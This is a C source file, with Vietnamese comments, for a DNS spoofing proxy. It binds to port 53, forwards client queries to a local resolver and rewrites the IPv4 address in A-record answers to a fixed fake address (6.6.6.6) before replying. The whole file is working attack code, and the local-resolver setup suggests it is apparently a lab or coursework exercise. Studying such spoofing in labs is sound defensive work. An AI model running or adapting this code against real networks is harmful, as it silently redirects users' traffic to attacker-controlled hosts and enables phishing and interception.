#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <ctype.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <sys/socket.h>

#define DNS_SERVER "127.0.0.1"  //DNS server hợp pháp để chuyển tiếp truy vấn
#define DNS_PORT 5053           //Cổng DNS server hợp pháp
#define SPOOF_IP "6.6.6.6"      //IP giả mạo mà ta muốn trả về

#define BUFFER_SIZE 1024    //Kích thước buffer

// DNS header structure (12 bytes)
struct dns_header {
    uint16_t id;        // ID của truy vấn
    uint16_t flags;     // Flags (trả lời, truy vấn, lỗi, ...)
    uint16_t qdcount;   // Số lượng câu truy vấn
    uint16_t ancount;   // Số lượng câu trả lời
    uint16_t nscount;   // Số lượng bản ghi tên miền
    uint16_t arcount;   // Số lượng bản ghi bổ sung
};

// Cấu trúc câu truy vấn DNS
struct dns_question {
    uint16_t qtype;     // Loại câu truy vấn (A, AAA, CNAME, ...)
    uint16_t qclass;    // Lớp bản ghi (thường là IN - Internet)
};

// Cấu trúc câu trả lời DNS
struct dns_rr {
    uint16_t type;          // Loại câu trả lời (A, AAA, MX, ...)
    uint16_t class;         // Lớp bản ghi (thường là IN - Internet)
    uint32_t ttl;           // Thời gian sống của bản ghi (TTL)
    uint16_t rdlength;      // Độ dài của dữ liệu trả lời
    unsigned char rdata[];  // Địa chỉ IP (chỉ áp dụng cho bản ghi A)
};

//Hàm kiểm tra xem có phải phản hồi DNS hợp lệ không
int is_dns_response(unsigned char *buffer) {
    struct dns_header *dns = (struct dns_header *)buffer;
    return (ntohs(dns->ancount) > 0);   //Kiểm tra số lượng câu trả lời, nếu lớn hơn 0 thì là phản hồi DNS
}

//Hàm in gói tin DNS dưới dạng hex (hữu ích để debug)
void print_buffer_in_hex(unsigned char *buffer, int size) {
    for (int i = 0; i < size; i++) {        //Duyệt qua từng byte trong buffer
        printf("%02x ", buffer[i]);         //In ra giá trị hex của byte đó
        //In ra dấu cách sau mỗi 16 byte
        if ((i + 1) % 16 == 0) printf("\n");
    }
    printf("\n");
}

//Hàm xử lý DNS spoofing
//Hàm này sẽ nhận gói tin DNS từ client, chuyển tiếp đến DNS server hợp pháp, nhận phản hồi từ DNS server hợp pháp, sửa đổi phản hồi và trả về cho client
void spoof_dns_response(unsigned char *bufferr, int response_size) {
    struct dns_header *dns = (struct dns_header *)bufferr;  //Chuyển buffer sang cấu trúc header DNS

    //Điểm bát đầu của câu hỏi
    unsigned char *reader = bufferr + sizeof(struct dns_header); //Bắt đầu từ sau header DNS

    //Bỏ qua phần tên miền trong câu hỏi (chuỗi được mã hóa theo cấu trúc DNS)
    while (*reader != 0) reader++;  //Duyệt qua tên miền
    reader += 1;                    //Bỏ qua byte NULL kết thúc

    struct dns_question *question = (struct dns_question *)reader; //Chuyển reader sang cấu trúc câu hỏi DNS
    reader += sizeof(struct dns_question); //Di chuyển đến phần câu trả lời

    //Nếu câu trả lời là bản ghi A (IPv4)
    if (ntohs(question->qtype) == 1) {
        struct dns_rr *answer = (struct dns_rr *)reader; //Chuyển reader sang cấu trúc câu trả lời DNS

        //Kiểm tra nếu đây là phản hồi IPv4 hợp lệ
        if (ntohs(answer->type) == 1 && ntohs(answer->class) == 1 && ntohs(answer->rdlength) == 4) {
            printf("[+] Spoofing response! Changing IP address to %s\n", SPOOF_IP);

            //Thay đổi địa chỉ IP trong phản hồi
            //Chú ý: Địa chỉ IP được lưu dưới dạng network byte order (big-endian)
            //Nếu muốn thay đổi địa chỉ IP, cần chuyển địa chỉ IP mới sang network byte order
            //Sau đó gán giá trị mới vào trường rdata của câu trả lời
            //Ví dụ: answer->rdata = htonl(inet_addr(SPOOF_IP));
            //Chú ý: Cần cập nhật lại độ dài của dữ liệu trả lời (rdlength) nếu thay đổi địa chỉ IP
            inet_pton(AF_INET, SPOOF_IP, answer->rdata);
        }
    }
}

int main() {
    int sockfd;
    struct sockaddr_in servaddr, cliaddr;
    char buffer[BUFFER_SIZE];
    socklen_t len = sizeof(cliaddr);

    // Tạo socket UDP
    if ((sockfd = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("socket creation failed");
        exit(EXIT_FAILURE);
    }

    memset(&servaddr, 0, sizeof(servaddr));     //Xóa bộ nhớ đệm của địa chỉ máy chủ
    servaddr.sin_family = AF_INET;              //IPv4
    servaddr.sin_addr.s_addr = INADDR_ANY;      //IP của máy chủ (máy chủ sẽ lắng nghe trên tất cả các địa chỉ IP của máy)
    servaddr.sin_port = htons(53);              //Cổng DNS tiêu chuẩn

    // Bind socket với địa chỉ và cổng
    if (bind(sockfd, (struct sockaddr*)&servaddr, sizeof(servaddr)) < 0) {
        perror("bind failed");
        exit(EXIT_FAILURE);
    }

    while(1) {
        // Receive DNS query from client
        int n = recvfrom(sockfd, buffer, BUFFER_SIZE, 0, 
                       (struct sockaddr*)&cliaddr, &len);

        // Chuyển tiếp truy vấn đến DNS hợp lệ (DNSMASQ)
        struct sockaddr_in dns_addr;
        memset(&dns_addr, 0, sizeof(dns_addr));     //Xóa bộ nhớ đệm của địa chỉ DNS
        dns_addr.sin_family = AF_INET;              //IPv4
        dns_addr.sin_port = htons(DNS_PORT);        //Cổng DNS của DNS server hợp pháp
        inet_pton(AF_INET, DNS_SERVER, &dns_addr.sin_addr); //IP của DNS server hợp pháp

        int forward_sock = socket(AF_INET, SOCK_DGRAM, 0);      //Tạo socket UDP mới để chuyển tiếp truy vấn
        sendto(forward_sock, buffer, n, 0, 
              (struct sockaddr*)&dns_addr, sizeof(dns_addr));   //Chuyển tiếp truy vấn đến DNS server hợp pháp

        // Nhận phản hồi từ DNS server hợp pháp
        char response[BUFFER_SIZE];
        socklen_t dns_len = sizeof(dns_addr);           //Kích thước địa chỉ DNS
        int m = recvfrom(forward_sock, response, 1024, 0, 
                        (struct sockaddr*)&dns_addr, &dns_len);     //Nhận phản hồi từ DNS server hợp pháp
        close(forward_sock);        //Đóng socket chuyển tiếp

        // Kiểm tra xem phản hồi có phải là phản hồi DNS không
        if (is_dns_response((unsigned char *)response)) {
            printf("DNS Response Detected, original:\n");
            print_buffer_in_hex((unsigned char *)response, m);      //In ra phản hồi DNS dưới dạng hex, m là kích thước phản hồi

            //Thực hiện spoofing nết có bản ghi A trong phản hồi
            spoof_dns_response((unsigned char *)response, m);   
        }
        
        //Gửi phản hồi đã được sửa đổi đến client
        sendto(sockfd, response, m, 0, 
              (struct sockaddr*)&cliaddr, len);
        
        printf("Spoofed DNS response sent to client\n");
    }

    close(sockfd);
    return 0;
}